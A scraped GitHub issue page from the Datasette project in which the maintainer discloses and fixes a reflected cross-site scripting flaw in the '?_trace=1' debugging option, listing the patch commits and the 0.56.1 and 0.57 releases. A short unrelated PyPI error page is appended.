  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsimonw%2Fdatasette%2Fissues%2F1360)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=simonw%2Fdatasette)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[simonw](/simonw)
/
**[datasette](/simonw/datasette)**
Public

* [Notifications](/login?return_to=%2Fsimonw%2Fdatasette) You must be signed in to change notification settings
* [Fork
  702](/login?return_to=%2Fsimonw%2Fdatasette)
* [Star
   9.7k](/login?return_to=%2Fsimonw%2Fdatasette)

* [Code](/simonw/datasette)
* [Issues
  563](/simonw/datasette/issues)
* [Pull requests
  54](/simonw/datasette/pulls)
* [Discussions](/simonw/datasette/discussions)
* [Actions](/simonw/datasette/actions)
* [Wiki](/simonw/datasette/wiki)
* [Security](/simonw/datasette/security)
* [Insights](/simonw/datasette/pulse)

Additional navigation options

* [Code](/simonw/datasette)
* [Issues](/simonw/datasette/issues)
* [Pull requests](/simonw/datasette/pulls)
* [Discussions](/simonw/datasette/discussions)
* [Actions](/simonw/datasette/actions)
* [Wiki](/simonw/datasette/wiki)
* [Security](/simonw/datasette/security)
* [Insights](/simonw/datasette/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fsimonw%2Fdatasette%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fsimonw%2Fdatasette%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Security flaw, to be fixed in 0.56.1 and 0.57 #1360

Closed

[simonw](/simonw) opened this issue
Jun 5, 2021
· 2 comments

Closed

# [Security flaw, to be fixed in 0.56.1 and 0.57](#top) #1360

[simonw](/simonw) opened this issue
Jun 5, 2021
· 2 comments

Labels
[security](/simonw/datasette/labels/security)

## Comments

[![@simonw](https://avatars.githubusercontent.com/u/9599?s=80&u=b14820695cc6ae03f8a831990697bc040596c0f4&v=4)](/simonw)

Copy link

Owner

### **[simonw](/simonw)** commented [Jun 5, 2021](#issue-912464443) • edited Loading

| See security advisory here for details: [GHSA-xw7c-jx9m-xh5g](https://github.com/simonw/datasette/security/advisories/GHSA-xw7c-jx9m-xh5g "GHSA-xw7c-jx9m-xh5g") - the `?_trace=1` debugging option was not correctly escaping its JSON output, resulting in a [reflected cross-site scripting](https://owasp.org/www-community/attacks/xss/#reflected-xss-attacks) vulnerability. |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@simonw](https://avatars.githubusercontent.com/u/9599?s=40&u=b14820695cc6ae03f8a831990697bc040596c0f4&v=4)](/simonw)
[simonw](/simonw)
added
the
[security](/simonw/datasette/labels/security)
label
[Jun 5, 2021](#event-4847237389)

[simonw](/simonw)
added a commit
that referenced
this issue
[Jun 5, 2021](#ref-commit-26fc539)
[![@simonw](https://avatars.githubusercontent.com/u/9599?s=40&u=b14820695cc6ae03f8a831990697bc040596c0f4&v=4)](/simonw)

`[Correctly escape output of ?_trace, refs](/simonw/datasette/commit/26fc539312bca2551b6f048b6bcf4ffbb491289f "Correctly escape output of ?_trace, refs #1360") [#1360](https://github.com/simonw/datasette/issues/1360)`

`[26fc539](/simonw/datasette/commit/26fc539312bca2551b6f048b6bcf4ffbb491289f)`

[simonw](/simonw)
added a commit
that referenced
this issue
[Jun 5, 2021](#ref-commit-6536e02)
[![@simonw](https://avatars.githubusercontent.com/u/9599?s=40&u=b14820695cc6ae03f8a831990697bc040596c0f4&v=4)](/simonw)

`[Release 0.56.1](/simonw/datasette/commit/6536e02f7412591501eeda9b07ef7977246578f2 "Release 0.56.1

Refs #1360")`
…

`[6536e02](/simonw/datasette/commit/6536e02f7412591501eeda9b07ef7977246578f2)`

```
Refs [#1360](https://github.com/simonw/datasette/issues/1360)
```

[simonw](/simonw)
added a commit
that referenced
this issue
[Jun 5, 2021](#ref-commit-8f311d6)
[![@simonw](https://avatars.githubusercontent.com/u/9599?s=40&u=b14820695cc6ae03f8a831990697bc040596c0f4&v=4)](/simonw)

`[Correctly escape output of ?_trace, refs](/simonw/datasette/commit/8f311d6c1d9f73f4ec643009767749c17b5ca5dd "Correctly escape output of ?_trace, refs #1360") [#1360](https://github.com/simonw/datasette/issues/1360)`

`[8f311d6](/simonw/datasette/commit/8f311d6c1d9f73f4ec643009767749c17b5ca5dd)`

[simonw](/simonw)
added a commit
that referenced
this issue
[Jun 5, 2021](#ref-commit-58746d3)
[![@simonw](https://avatars.githubusercontent.com/u/9599?s=40&u=b14820695cc6ae03f8a831990697bc040596c0f4&v=4)](/simonw)

`[Release 0.57](/simonw/datasette/commit/58746d3c514004f504223a724e948469a0d4abb3 "Release 0.57

Refs #263, #615, #619, #1238, #1257, #1305, #1308, #1320, #1332, #1337, #1349, #1353, #1359, #1360")`
…

`[58746d3](/simonw/datasette/commit/58746d3c514004f504223a724e948469a0d4abb3)`

```
Refs [#263](https://github.com/simonw/datasette/issues/263), [#615](https://github.com/simonw/datasette/issues/615), [#619](https://github.com/simonw/datasette/issues/619), [#1238](https://github.com/simonw/datasette/issues/1238), [#1257](https://github.com/simonw/datasette/issues/1257), [#1305](https://github.com/simonw/datasette/issues/1305), [#1308](https://github.com/simonw/datasette/issues/1308), [#1320](https://github.com/simonw/datasette/issues/1320), [#1332](https://github.com/simonw/datasette/issues/1332), [#1337](https://github.com/simonw/datasette/issues/1337), [#1349](https://github.com/simonw/datasette/issues/1349), [#1353](https://github.com/simonw/datasette/issues/1353), [#1359](https://github.com/simonw/datasette/issues/1359), [#1360](https://github.com/simonw/datasette/issues/1360)
```

[![@simonw](https://avatars.githubusercontent.com/u/9599?s=40&u=b14820695cc6ae03f8a831990697bc040596c0f4&v=4)](/simonw)
[simonw](/simonw)
mentioned this issue
[Jun 5, 2021](#ref-issue-912418094)

[Release Datasette 0.57
#1358](/simonw/datasette/issues/1358)

Closed

[![@simonw](https://avatars.githubusercontent.com/u/9599?s=80&u=b14820695cc6ae03f8a831990697bc040596c0f4&v=4)](/simonw)

Copy link

Owner

Author

### **[simonw](/simonw)** commented [Jun 5, 2021](#issuecomment-855303649)

| I've released fixes in both 0.56.1 and 0.57. |
| --- |

All reactions

Sorry, something went wrong.

[![@simonw](https://avatars.githubusercontent.com/u/9599?s=40&u=b14820695cc6ae03f8a831990697bc040596c0f4&v=4)](/simonw)
[simonw](/simonw)
closed this as [completed](/simonw/datasette/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Jun 5, 2021](#event-4847263666)

[![@simonw](https://avatars.githubusercontent.com/u/9599?s=80&u=b14820695cc6ae03f8a831990697bc040596c0f4&v=4)](/simonw)

Copy link

Owner

Author

### **[simonw](/simonw)** commented [Jun 5, 2021](#issuecomment-855303776)

| Worth noting that I found this issue myself, and to my knowledge it has not been uncovered by anyone else prior to the patch being released. |
| --- |

All reactions

Sorry, something went wrong.

[simonw](/simonw)
added a commit
to simonw/datasette-auth-passwords
that referenced
this issue
[Jun 5, 2021](#ref-commit-0fc7a42)
[![@simonw](https://avatars.githubusercontent.com/u/9599?s=40&u=b14820695cc6ae03f8a831990697bc040596c0f4&v=4)](/simonw)

`[Release 0.4.1](/simonw/datasette-auth-passwords/commit/0fc7a42f4d8a6316b907c8e0a49f8bf1d825d5a8 "Release 0.4.1

Now depends on datasette>=0.56.1

Refs https://github.com/simonw/datasette/issues/1360")`
…

`[0fc7a42](/simonw/datasette-auth-passwords/commit/0fc7a42f4d8a6316b907c8e0a49f8bf1d825d5a8)`

```
Now depends on datasette>=0.56.1

Refs [simonw/datasette#1360](https://github.com/simonw/datasette/issues/1360)
```

[![@simonw](https://avatars.githubusercontent.com/u/9599?s=40&u=b14820695cc6ae03f8a831990697bc040596c0f4&v=4)](/simonw)
[simonw](/simonw)
mentioned this issue
[Jun 6, 2021](#ref-issue-912864936)

[Consider using CSP to protect against future XSS
#1362](/simonw/datasette/issues/1362)

Open

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fsimonw%2Fdatasette%2Fissues%2F1360)

Assignees

No one assigned

Labels

[security](/simonw/datasette/labels/security)

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

1 participant

[![@simonw](https://avatars.githubusercontent.com/u/9599?s=52&v=4)](/simonw)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from pypi.org_b563f6f2_20250114_233549.html ===

![Error Icon](/_fs-ch-1T1wmsGaOgGaSxcX/assets/errorIcon.svg)
JavaScript is disabled in your browser.
Please enable JavaScript to proceed.

A required part of this site couldn’t load. This may be due to a browser
extension, network issues, or browser settings. Please check your
connection, disable any ad blockers, or try using a different browser.


